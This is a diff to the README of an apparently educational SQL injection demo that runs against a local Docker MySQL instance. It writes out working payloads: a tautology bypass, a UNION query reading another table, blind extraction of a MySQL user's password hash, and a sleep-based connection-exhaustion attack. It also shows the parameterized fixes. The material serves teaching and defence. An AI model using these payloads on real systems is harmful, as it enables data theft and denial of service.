@@ -17,11 +17,11 @@ Since we need to show vulnerabilities with Stored procedure and 'Principle of le
 Build Docker image for custom Mysql instance
 
     cd docker/sqlinjection
-    docker build -t sqlinjection_demo:latest
+    docker build -t sqlinjection_demo:latest .
 
 Run above created Mysql image 
 
-    docker run -p 3306:3306 --name local-mysql -e MYSQL_ROOT_PASSWORD=11asd097asd -d sqlinjection_demo:latest
+    docker run -p 3307:3306 --name local-mysql -e MYSQL_ROOT_PASSWORD=11asd097asd -d sqlinjection_demo:latest
 
 Run the demo application
 
@@ -85,11 +85,11 @@ Now we would try to use the demo application to execute these methods and then w
 
 This is how you would normally call the filterUserJdbcUnSafe endpoint to filter employees by name
     
-    http http://localhost:8080/filterUserJdbcUnSafe name=="Bilbo" 
+    http://localhost:8080/filterUserJdbcUnSafe?name=Bilbo 
     
 This is how hacker might use this endpoint
 
-    http http://localhost:8080/filterUserJdbcUnSafe name=="Bilbo' or '1' = '1"  
+    http://localhost:8080/filterUserJdbcUnSafe?name=Bilbo'or'1'='1  
 
 and this would generate a sql query like "select * from employee where name ='Bilbo' or '1' = '1'" and basically return you list of all the employees instead and here is the response:
 
@@ -141,7 +141,7 @@ And this is how you call it using JPA
     
 And same exploit happens when called with hacky data input 
 
-    http http://localhost:8080/filterUserJpaStoredProcedureUnSafe name=="Bilbo' or '1' = '1"
+    http://localhost:8080/filterUserJpaStoredProcedureUnSafe?name=Bilbo' or '1' = '1
 
 ### Different types of SQL Injection Techniques
 You can easily divide the SQL Injection attacks based on different techniques used to exploit the vulnerability. Here we will talk about some of the most common ones.
@@ -153,16 +153,17 @@ So for instance there is a web endpoint to filter the list of employees in the c
 
 Find all the employees who have name "Bilbo"
 
-    http http://localhost:8080/filterUserJdbcUnSafe name=="Bilbo"
+    http://localhost:8080/filterUserJdbcUnSafe?name=Bilbo
     
 And this could be used by hacker to get list of all the employees by adding a boolean clause "or '1' = '1"" like this:
 
-    http http://localhost:8080/filterUserJdbcUnSafe name=="Bilbo' or '1' = '1"
+    http://localhost:8080/filterUserJdbcUnSafe?name=Bilbo' or '1' = '1
 
 #### 2. Union
 In this the hacker adds a UNION SQL clause to the SELECT query which is vulnerable and the response would then contain data from other table if specified. 
 
-    http http://localhost:8080/filterUserGlobalAccessUnSafe name=="Bilbo' union all select 1, concat(review,'-----',rating),review,  'STAFF'  from management.employee_review where '1'='1"
+    http://localhost:8080/filterUserGlobalAccessUnSafe?name=Bilbo' union all select 1, concat(review,'-----',rating),review,  'STAFF'  from management.employee_review where '1'='1
+    
     HTTP/1.1 200 
     Connection: keep-alive
     Content-Type: application/json
@@ -206,7 +207,7 @@ And this would tell hacker that the first character of empdb_user's password is 
 
 Let's see this in action
 
-    http http://localhost:8080/loginJdbcUnSafe name=="Bilbo" password=="secret' and (select CASE WHEN (substring(authentication_string,1,1) = '$' ) THEN true ELSE false END from  mysql.user where User = 'empdb_user') or '"
+    http://localhost:8080/loginJdbcUnSafe?name=Bilbo&password=secret' and (select CASE WHEN (substring(authentication_string,1,1) = '$' ) THEN true ELSE false END from  mysql.user where User = 'empdb_user') or '
 
 and with the help of substring and comparison operator like '>', '<', '=', '!=' and binary search, hacker can easily guess all the characters in the password column. Hacker can easily use this technique in similar fashion to get data out of tables in INFORMATION_SCHEMA database. It's time consuming but hack can use tools like [sqlmap](http://sqlmap.org/) to speed up the attack.
 
@@ -214,8 +215,12 @@ and with the help of substring and comparison operator like '>', '<', '=', '!=' 
 In this type of Injection, the hacker tries to introduce a delay function like sleep(time) or Benchmark(count,expr) in the SQL query and as a result the web request would take longer than usual time to respond. 
 
 Normally the web applications have a pool of database connection open and the hacker can use this technique to exhaust all of them pretty quickly. Once all the database connections are queued or sleeping because of delay, the database server would stop accepting new connections. 
-
-    http http://localhost:8080/filterUserJdbcUnSafe name=="Bilbo' + sleep(10)+'"
+    
+    DOESN'T WORK IN BROWSER
+    http://localhost:8080/filterUserJdbcUnSafe?name=Bilbo'; + select sleep(1)+'
+    
+    In Mysql CLI the relevant SQL request works pretty well - please add ";" as the last symbol in CLI.
+    select * from employee where name ='Bilbo'; select sleep(1) '';
 
 So this technique is very unique, since using this you are not getting any data out of the application, but using it to do a DDoS attack on the application.
 
@@ -251,8 +256,8 @@ or in case of JPA above would look like
 
 And now if we call either of the above implementation with the hackers input:
 
-    http http://localhost:8080/filterUserJdbcSafe name=="Bilbo' or '1' = '1"
-    http http://localhost:8080/filterUserJpaSafe name=="Bilbo' or '1' = '1"
+    http://localhost:8080/filterUserJdbcSafe?name=Bilbo' or '1' = '1
+    http://localhost:8080/filterUserJpaSafe?name=Bilbo' or '1' = '1
 
 the response we receive is a empty list, since the above request created a sql query list "select * from employee where name ="Bilbo' or '1' = '1" " and that would match no employee.
 
@@ -278,7 +283,7 @@ In case of Stored Procedure it's even more simpler and you need not use EXECUTE 
     
 Let's try this out in demo application
     
-    http http://localhost:8080/filterUserJpaStoredProcedureSafe name=="Bilbo' or '1' = '1" 
+    http://localhost:8080/filterUserJpaStoredProcedureSafe?name=Bilbo' or '1' = '1 
 
 And this would return a empty list, since now the filter param matches none of the employee's name.
 
